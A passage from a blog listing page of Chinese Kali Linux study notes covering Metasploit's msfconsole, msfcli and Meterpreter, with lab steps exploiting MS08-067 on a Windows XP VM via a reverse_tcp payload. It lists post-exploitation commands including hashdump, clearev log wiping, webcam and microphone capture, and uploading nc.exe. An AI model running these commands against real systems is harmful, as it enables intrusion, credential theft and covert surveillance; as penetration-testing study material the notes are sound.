<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP2主机<ul>
<li>浏览器访问<a href="http://Kali的IP/" target="_blank" rel="noopener">http://Kali的IP/</a></li>
</ul>
</li>
<li>Kali之际<ul>
<li>看是否返回有关session、shell`**</li>
<li><strong><code>🔺命令：sessions -l</code></strong></li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：shell</code></strong></li>
<li><strong><code>🔺命令：shutdown -r</code></strong></li>
</ul>
</li>
<li>2020.2.26 暂无下载Window XP SP2，但在Window XP SP3上无法exploit</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell/" itemprop="url">Kali Linux笔记(一百)：Meterpreter Shell</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T15:36:20+08:00">
                2020-02-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  960 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Meterpreter"><a href="#1-Meterpreter" class="headerlink" title="1. Meterpreter"></a>1. Meterpreter</h4><ul>
<li>高级、动态、可扩展的Payload（同Nanocode同样的多功能payload）<ul>
<li>基于meterpreter上下文利用更多漏洞发起攻击</li>
<li>后渗透测试阶段一站式操作界面</li>
</ul>
</li>
<li>完全基于内存的DLL注入式payload（不写硬盘，硬盘查杀无效果）<ul>
<li>注入合法系统进程并建立stager</li>
<li>基于stager上传和预加载DLL进行扩展模块的注入（客户端API）</li>
<li>基于stager建立的socket连接建立加密的TLS/1.0通信隧道</li>
<li>利用TLS隧道进一步加载后续扩展模块（避免网络取证）</li>
</ul>
</li>
<li>服务端使用C语言编写</li>
<li>客户端提供基于ruby的全特性API（支持任何语言）</li>
</ul>
<h4 id="2-Meterpreter基本命令"><a href="#2-Meterpreter基本命令" class="headerlink" title="2. Meterpreter基本命令"></a>2. Meterpreter基本命令</h4><ul>
<li><strong><code>🔺命令：help</code></strong>：查看meterpreter可使用的命令</li>
<li><strong><code>🔺命令：background</code></strong>：回到msfconsole的界面</li>
<li><strong><code>🔺命令：pwd</code></strong>：可查看到window下的目录路径</li>
<li><strong><code>🔺命令：cd</code></strong>：进入window下一个目录</li>
<li><strong><code>🔺命令：dir/ls</code></strong>：查看本目录文件</li>
<li><strong><code>🔺命令：cat</code></strong>：查看文件内容</li>
<li><strong><code>🔺命令：mkdir/rmdir</code></strong>：创建/删除一个的目录</li>
<li><strong><code>🔺命令：mv</code></strong>：对文件进行改名</li>
<li><strong><code>🔺命令：rm</code></strong>：删除一个文件</li>
<li><strong><code>🔺命令：edit</code></strong>：编辑目标文件</li>
<li><strong><code>🔺命令：lpwd</code></strong>：local远端机器本地目录</li>
<li><strong><code>🔺命令：lcd</code></strong>：进入local远端机器本地目录的其他目录</li>
<li><strong><code>🔺命令：run</code></strong>：前端运行</li>
<li>⭐ <strong><code>🔺命令：bgrun</code></strong>：后台运行脚本<ul>
<li>▲ 有大量脚本，enum_ie/enum_share/hashdump等</li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：clearev</code></strong>：清除目标系统日志<br> -（Win+R → eventvwr → 应用程序/安全性/系统 → 一般会在系统日志留下痕迹）</li>
<li><strong><code>🔺命令：download</code></strong>：下载文件到本地系统<ul>
<li><strong><code>🔺命令：upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：execute -f cmd.exe -i –H</code></strong>：执行一个命令<ul>
<li>-f：执行的程序</li>
<li>-i：进行交互性shell</li>
<li>-H：程序进行隐藏</li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong>：查看登陆的账号</li>
<li><strong><code>🔺命令：getsystem</code></strong>：如若账号为非system，则提权为system</li>
<li><strong><code>🔺命令：getprivs</code></strong>：查看被控机器账号权限</li>
<li><strong><code>🔺命令：getproxy</code></strong>：获取被控机器浏览器设置的代理</li>
<li><strong><code>🔺命令：getpid</code></strong>：当前注入的合法进程的PID号</li>
<li><strong><code>🔺命令：migrate PID</code></strong>：可进行进程迁移</li>
<li><strong><code>🔺命令：hashdump</code></strong>：dump被控机器账号的hash值<ul>
<li><strong><code>🔺命令：run post/windows/gather/hashdump</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：sysinfo</code></strong>：系统信息</li>
<li><strong><code>🔺命令：kill PID</code></strong>：杀死进程，通过PID去杀死</li>
<li><strong><code>🔺命令：shell</code></strong>：获取操作系统的shell</li>
<li><strong><code>🔺命令：show_mount</code></strong>：挂载的操作系统分区</li>
<li>̵<strong><code>🔺命令：search -f autoexec.bat</code></strong>：搜索目录</li>
<li><strong><code>🔺命令：arp</code></strong>：查看被控机器的arp</li>
<li><strong><code>🔺命令：netstat</code></strong>：查看被控机器网络连接情况</li>
<li><strong><code>🔺命令：ifconfig/ipconfig</code></strong>：查看IP情况</li>
<li><strong><code>🔺命令：route</code></strong>：查看路由表（可添加路由表）</li>
<li><strong><code>🔺命令：idletime</code></strong>：查看被控机器当前空闲时间</li>
<li><strong><code>🔺命令：resource</code></strong>：调用外部资源文件，可为可执行的指令文件</li>
<li><strong><code>🔺命令：record_mic</code></strong>：记录被控机器麦克风的声音</li>
<li><strong><code>🔺命令： webcam_list</code></strong>：列出被控机器所以的摄像头<ul>
<li><strong><code>🔺命令：webcam_snap -i 1 -v false</code></strong>（每个一秒钟进行拍照）</li>
</ul>
</li>
</ul>
<h4 id="3-Meterpreter-Python扩展"><a href="#3-Meterpreter-Python扩展" class="headerlink" title="3. Meterpreter Python扩展"></a>3. Meterpreter Python扩展</h4><ul>
<li>2015年11月份，来自社区的贡献</li>
<li>▲ 无需运行环境，在客户端运行原生python代码</li>
<li><strong><code>🔺命令：load python</code></strong><ul>
<li><strong><code>🔺命令：Help</code></strong></li>
<li><strong><code>🔺命令：python_execute &quot;print (&#39;asdasdas&#39;)&quot;</code></strong> </li>
<li><strong><code>🔺命令：python_execute &quot;import os; cd = os.getcwd()&quot; -r cd</code></strong> </li>
<li><strong><code>🔺命令：python_import -f find.py</code></strong>  ▲ 2020.2.26 Command executed without returing a result</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">for root,dirs,files in os.walk(&quot;C:\\&quot;):</span><br><span class="line">    for file in files:</span><br><span class="line">        if file.endswith(&quot;.ini&quot;) and file.startswith(&quot;win&quot;):</span><br><span class="line">            print(os.path.john(root.file))</span><br></pre></td></tr></table></figure>

<h4 id="4-实验"><a href="#4-实验" class="headerlink" title="4. 实验"></a>4. 实验</h4><ul>
<li>Kali主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window XP SP3主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>关闭防火墙，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali主机<ul>
<li><strong><code>🔺命令：msconsole</code></strong><ul>
<li><strong><code>🔺命令：use exploit/windows/browser/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window Xp的IP</code></strong></li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：set PAYLOAD windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：exploit -j</code></strong></li>
<li><strong><code>🔺命令：sessions -l</code></strong></li>
<li><strong><code>🔺命令：sessions -i 1</code></strong>（进入的是meterpreter的shell）</li>
<li><strong><code>🔺命令：meterpreter</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B9%9D)%EF%BC%9AMSF--msfcli%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B9%9D)%EF%BC%9AMSF--msfcli%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/" itemprop="url">Kali Linux笔记(九十九)：MSF--msfcli控制台命令</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T15:28:02+08:00">
                2020-02-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  165 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Msfcli"><a href="#1-Msfcli" class="headerlink" title="1. Msfcli"></a>1. Msfcli</h4><ul>
<li>2015年6月已经被取消</li>
<li>由<strong><code>🔺命令：msfconsole -x</code></strong>取代</li>
<li>编写脚本时便于引用，可调用自写的脚本</li>
<li><strong><code>🔺命令：msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 1.1.1.1; set PAYLOAD windows/meterpreter/ reverse_tcp; set LHOST 1.1.1.8; set LPORT 5555; set target 34; exploit&quot;</code></strong></li>
</ul>
<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
<li>Kali主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window XP SP3主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>关闭防火墙，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali主机<ul>
<li><strong><code>🔺命令：msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST Window XP的IP; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST Kali的IP; set LPORT 5555; set target 34; exploit&quot;</code></strong></li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%85%AB)%EF%BC%9AMSF--msfconsole%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%85%AB)%EF%BC%9AMSF--msfconsole%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/" itemprop="url">Kali Linux笔记(九十八)：MSF--msfconsole控制台命令</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T15:15:47+08:00">
                2020-02-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  692 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1. 基本使用"></a>1. 基本使用</h4><ul>
<li>使用前先升级：<strong><code>🔺命令：msfupdate</code></strong></li>
<li>Msfcli使用接口</li>
<li>Msfconsole使用接口<ul>
<li>最流行的用户接口</li>
<li>几乎可以使用全部MSF功能</li>
<li>控制台命令支持TAB自动补齐</li>
<li>支持外部命令的执行（系统命令等）</li>
<li>启动方式：点击鼠标启动 / <strong><code>🔺命令：msfconsole -h</code></strong> / exit<ul>
<li>-q（安静方式启动）</li>
<li>-r（资源文件）</li>
<li>-v（版本信息）</li>
</ul>
</li>
<li>help / ? / help vulns</li>
</ul>
</li>
</ul>
<h4 id="2-MSF控制台命令–基本命令"><a href="#2-MSF控制台命令–基本命令" class="headerlink" title="2. MSF控制台命令–基本命令"></a>2. MSF控制台命令–基本命令</h4><ul>
<li><strong><code>🔺命令：banner</code></strong>：MSF的banner信息，每次都有不一样的tips</li>
<li><strong><code>🔺命令：color</code></strong>：改变使用模块颜色提示</li>
<li><strong><code>🔺命令：connect -h</code></strong>：同nc，可以连接其他终端等</li>
<li><strong><code>🔺命令：show auxiliary / exploits / payloads / encoders / nops</code></strong>：显示可用资源</li>
<li><strong><code>🔺命令：search usermap_script / help search</code></strong>：搜索所需资源的位置<ul>
<li><strong><code>🔺命令：search name:mysql / path:scada / platform:aix / type:aux /author:aaron / cve:2011</code></strong>（可多条件同时搜索）</li>
</ul>
</li>
<li><strong><code>🔺命令：use dos/windows/smb/ms09_001_write</code></strong>：使用模块<ul>
<li><strong><code>🔺命令：info</code></strong>：显示模块具体信息</li>
<li><strong><code>🔺命令：show options / payloads / targets / advanced / evasion / missing</code></strong></li>
<li><strong><code>🔺命令：edit</code></strong>：对模块内容进行修改</li>
</ul>
</li>
<li><strong><code>🔺命令：check</code></strong>：探测目标服务器是否存在此漏洞利用模块的漏洞，不利用模块</li>
<li><strong><code>🔺命令：back</code></strong>：退出此漏洞利用模块</li>
<li><strong><code>🔺命令：set / unset</code></strong>：设置命令</li>
<li><strong><code>🔺命令：setg / unsetg</code></strong>：全局变量设置</li>
<li><strong><code>🔺命令：save</code></strong>：对全局变量设置的保存，文件默认保存在/root/.msf4/config</li>
<li><strong><code>🔺命令：run / exploit -j</code></strong>：前后台模式<ul>
<li>▲ 执行此模块，需设置target和payload</li>
</ul>
</li>
<li><strong><code>🔺命令：session</code></strong>：攻击成功建立的会话 <ul>
<li><strong><code>🔺命令：session -l / -i</code></strong>（Shell Meterpreter sessionVNC） </li>
</ul>
</li>
<li><strong><code>🔺命令：load / unload</code></strong>：进行外部模块的导入，如openvas/Nessus</li>
<li><strong><code>🔺命令：loadpath</code></strong>：▲ 调用自开的模块</li>
<li><strong><code>🔺命令：route</code></strong>：通过指定session路由流量，通往内网的流量</li>
<li><strong><code>🔺命令：irb</code></strong>：编程开发接口（Framework::Version）</li>
<li><strong><code>🔺命令：resource</code></strong>：导入已设置的rc资源文件（<strong><code>🔺命令：▲ msfconsole -r a.rc</code></strong>）<ul>
<li><strong><code>🔺命令：vi /root/Desktop/a.rc</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong></li>
<li><strong><code>🔺命令：set RHOST 192.168.0.121</code></strong></li>
<li><strong><code>🔺命令：set LHOST 192.168.0.107</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：exploit -j</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-MSF控制台命令–数据库指令"><a href="#3-MSF控制台命令–数据库指令" class="headerlink" title="3. MSF控制台命令–数据库指令"></a>3. MSF控制台命令–数据库指令</h4><ul>
<li><strong><code>🔺命令：db_status</code></strong>：数据库的状态</li>
<li><strong><code>🔺命令：db_rebuild_cache</code></strong>：重建缓存模块：</li>
<li><strong><code>🔺命令：db_disconnect / db_connect</code></strong>：数据库的连接<ul>
<li><strong><code>🔺命令：db_disconnect -h</code></strong>（参数）</li>
<li><strong><code>🔺命令：db_disconnect /usr/share/metasploit-framework/config/database.yml</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：db_import / db_export</code></strong>：对信息进行备份和导出：<ul>
<li><strong><code>🔺命令：db_import /root/nmap.xml</code></strong>（<strong><code>🔺命令：nmap 192.168.0.0/24 -oX</code></strong> → 导出为xml文件）</li>
<li><strong><code>🔺命令：db_export -f xml /root/bak.xml</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：db_nmap：同namp，但数据会自动保存到数据库</code></strong><ul>
<li><strong><code>🔺命令：host / host 1.1.1.1 / hosts -u（开机状态） / hosts -c（指定列的名称） address,os_flavor / -S（搜索模式）Linux/window/121/1</code></strong></li>
<li><strong><code>🔺命令：services -p 80 / services -c（指定列的名称）info,name -p 1-1000 / -S （搜索模式）</code></strong></li>
<li><strong><code>🔺命令：vulns / loot</code></strong>（hashdump）</li>
<li><strong><code>🔺命令：creds--mysql_login</code></strong>（msf存在暴力破解mysql的模块，可以进行exploit）</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/20/Git%E7%AC%94%E8%AE%B0-9%EF%BC%9AGit%E5%B8%B8%E7%94%A8%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B7%A5%E5%85%B7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/20/Git%E7%AC%94%E8%AE%B0-9%EF%BC%9AGit%E5%B8%B8%E7%94%A8%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B7%A5%E5%85%B7/" itemprop="url">Git笔记-9：Git常用图形化工具</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-20T16:24:49+08:00">
                2020-02-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Git/" itemprop="url" rel="index">
                    <span itemprop="name">Git</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  14 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-常用工具"><a href="#1-常用工具" class="headerlink" title="1. 常用工具"></a>1. 常用工具</h4><ul>
<li>sourcetree</li>
<li>vscode</li>
<li>git图标：<a href="https://gitmoji.surge.sh" target="_blank" rel="noopener">https://gitmoji.surge.sh</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/">Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/4/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">143</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">6</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:tomassky7@gmail.com" target="_blank" title="Gmail邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>Gmail邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">128.1k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





